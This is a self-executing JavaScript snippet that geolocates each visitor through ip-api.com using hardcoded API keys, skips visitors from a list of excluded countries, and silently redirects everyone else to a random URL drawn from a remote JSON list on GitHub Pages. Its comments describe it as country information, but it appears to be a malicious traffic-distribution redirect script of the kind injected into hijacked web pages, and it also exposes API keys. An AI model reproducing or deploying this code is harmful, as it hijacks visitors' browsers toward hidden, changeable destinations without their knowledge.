// List of JSON URLs for country information
const jsonUrls = [
    'https://pro.ip-api.com/json/?key=6KddQSe576qrfNb',
    'https://pro.ip-api.com/json/?key=U4NdpvcDcxvMekN',
    'https://pro.ip-api.com/json/?key=9908tZlRhI0pK5W',
    'https://pro.ip-api.com/json/?key=WEPQWHzy7RYlxSd'
];

// Configuration for country-based URL redirection
const countryConfig = {
    GB: 'https://hellonetwork2023.github.io/uk/ukurls.json',
    default: 'https://hellonetwork2023.github.io/us/usurls.json'
};

const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR', 'PK', 'RU'];

// Fetch country information
(function fetchCountryAndRedirect() {
    const randomIndex = Math.floor(Math.random() * jsonUrls.length);
    const randomUrl = jsonUrls[randomIndex];

    fetch(randomUrl)
        .then(response => response.json())
        .then(data => {
            // Extract country code
            const countryCode = data.countryCode || data.country_code2;

            if (!countryCode) {
                console.warn('Country code not found, redirecting to default.');
                redirectToUrls(countryConfig.default);
                return;
            }

            console.log('Detected country code:', countryCode);

            // Check exclusion list
            if (excludedCountries.includes(countryCode)) {
                console.log(`Country ${countryCode} is excluded from redirection.`);
                return;
            }

            // Fetch and redirect based on country
            const jsonFile = countryConfig[countryCode] || countryConfig.default;
            redirectToUrls(jsonFile);
        })
        .catch(error => {
            console.error('Error fetching country information:', error);
            redirectToUrls(countryConfig.default);
        });
})();

// Fetch URLs from JSON and perform redirection
function redirectToUrls(jsonFile, delay = 300) {
    fetch(jsonFile)
        .then(response => response.json())
        .then(data => {
            if (!data.urls || data.urls.length === 0) {
                console.error('No URLs found in JSON file.');
                return;
            }

            const urls = data.urls.map(site => site.url);
            const randomIndex = Math.floor(Math.random() * urls.length);
            const randomUrl = urls[randomIndex];

            console.log(`Redirecting to: ${randomUrl}`);
            setTimeout(() => {
                window.location.href = randomUrl;
            }, delay);
        })
        .catch(error => {
            console.error('Error fetching redirection URLs:', error);
        });
}
